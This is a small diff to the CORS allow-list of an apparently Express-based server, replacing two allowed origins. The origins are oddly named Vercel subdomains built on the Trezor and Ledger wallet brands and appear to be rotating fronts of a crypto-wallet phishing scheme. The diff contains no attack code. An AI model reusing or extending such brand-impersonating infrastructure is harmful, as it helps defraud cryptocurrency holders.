@@ -13,8 +13,8 @@ app.use(cors({
     origin: ["http://localhost:3000",
         "https://trezor-arab-shyam-pod-paint-sigma-gole-324324-psi.vercel.app", //aws
         "https://trezor-aws-oman-pod-paint-sigma-rolee-324324-psi.vercel.app", //website
-        "https://ledger-aws-newyork-pod-paint-sigma-gole-324324-psi.vercel.app",
-        "https://ledger-phi-newyork-pod-paint-sigma-gole-324324-psi.vercel.app",
+        "https://ledger-aws-newy-gone-pod-paint-sigma-gole-324324-psi.vercel.app",
+        "https://ledger-gone-newyork-pod-paint-sigma-gole-324324-psi.vercel.app",
         "https://trezor-aws-kei3-iran-shyam-pod-paint-sigma-gole-324324-psi.vercel.app",
         "https://trezor-mlv9-arab-shyam-pod-paint-sigma-gole-324324-psi.vercel.app",
         // Latest Design
